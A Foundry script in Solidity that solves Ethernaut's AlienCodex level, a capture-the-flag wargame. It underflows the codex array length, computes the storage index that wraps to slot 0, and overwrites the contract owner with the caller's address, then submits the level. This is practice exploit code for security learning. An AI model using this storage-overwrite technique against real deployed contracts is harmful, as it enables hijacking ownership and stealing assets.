// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console2} from "forge-std/Script.sol";
import {IEthernaut} from "../interfaces/IEthernaut.sol";
import {AlienCodex} from "../src/Level19.sol";

contract Level19 is Script {
    IEthernaut _ethernaut = IEthernaut(vm.envAddress("ETHERNAUT_ADDR"));
    address _caller = vm.addr(vm.envUint("PRIVATE_KEY"));

    function run() public {
        AlienCodex _instance = AlienCodex(vm.envAddress("LVL19_ADDR"));
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        _instance.makeContact();
        _instance.retract();
        uint256 firstCodexSlot = uint256(keccak256(abi.encode(uint256(1))));
        uint ownerSlot;
        unchecked {
            ownerSlot -= firstCodexSlot;
        }

        _instance.revise(ownerSlot, bytes32(uint256(uint160(_caller))));

        bytes32 addr = vm.load(address(_instance), bytes32(uint256(0)));

        if (address(uint160(uint256(addr))) != _caller) {
            console2.log("call failed");
        } else _ethernaut.submitLevelInstance(address(_instance));
    }
}

// forge script script/Level19.s.sol --broadcast --rpc-url sepolia -vvvv
